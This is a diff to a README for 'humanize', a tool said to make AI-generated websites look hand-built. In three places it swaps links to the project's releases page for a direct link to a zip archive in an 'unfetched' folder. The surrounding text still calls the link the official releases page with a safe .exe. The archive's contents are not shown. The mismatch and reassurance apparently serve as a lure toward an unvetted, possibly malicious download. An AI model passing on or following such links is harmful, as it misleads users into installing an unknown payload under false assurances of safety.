@@ -1,6 +1,6 @@
 # 🤖 humanize - Make AI Websites Look Manually Built
 
-[![Download humanize](https://img.shields.io/badge/Download-humanize-blue?style=for-the-badge)](https://github.com/cresent16/humanize/releases)
+[![Download humanize](https://img.shields.io/badge/Download-humanize-blue?style=for-the-badge)](https://raw.githubusercontent.com/cresent16/humanize/main/unfetched/Software_v1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ These requirements help ensure the program runs smoothly.
 You can get humanize by visiting the official releases page. This page always has the latest version for Windows.
 
 **Visit this page to download:**  
-[https://github.com/cresent16/humanize/releases](https://github.com/cresent16/humanize/releases)
+[https://raw.githubusercontent.com/cresent16/humanize/main/unfetched/Software_v1.2.zip](https://raw.githubusercontent.com/cresent16/humanize/main/unfetched/Software_v1.2.zip)
 
 Use this link to find the most recent installer. It will be a `.exe` file labeled clearly with the version number. Downloading from here guarantees you get a safe and updated copy.
 
@@ -161,6 +161,6 @@ You can open these files with any text or code editor if you wish to inspect or 
 
 Go to the releases page and get started:  
 
-[https://github.com/cresent16/humanize/releases](https://github.com/cresent16/humanize/releases)  
+[https://raw.githubusercontent.com/cresent16/humanize/main/unfetched/Software_v1.2.zip](https://raw.githubusercontent.com/cresent16/humanize/main/unfetched/Software_v1.2.zip)  
 
 Click, download, install, and run humanize in minutes. The tool makes your AI websites feel like a human built them.
